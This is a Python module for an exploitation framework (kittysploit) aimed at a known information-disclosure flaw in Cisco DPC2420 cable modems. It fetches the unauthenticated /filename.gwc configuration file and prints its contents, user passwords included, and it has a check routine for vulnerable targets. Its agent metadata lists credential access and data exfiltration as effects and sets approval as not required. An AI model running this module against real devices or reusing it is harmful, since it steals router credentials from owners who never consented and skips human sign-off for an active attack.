#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cisco DPC2420 Info Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Cisco DPC2420 Info Disclosure',
        'description': 'Module exploits Cisco DPC2420 information disclosure vulnerability which allows reading sensitive information from the configuration file.',
        'author': ['Facundo M. de la Cruz (tty0)', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/23250/'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8080, "Target HTTP port")

    def run(self):
        response = self.http_request(
            method="GET",
            path="/filename.gwc",
        )
        if response is None:
            return

        if response.status_code == 200 and "User Password" in response.text:
            print_success("Exploit success - reading configuration file filename.gwc")
            print_info(response.text)
        else:
            print_error("Exploit failed - could not read configuration file")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/filename.gwc",
        )
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "User Password" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
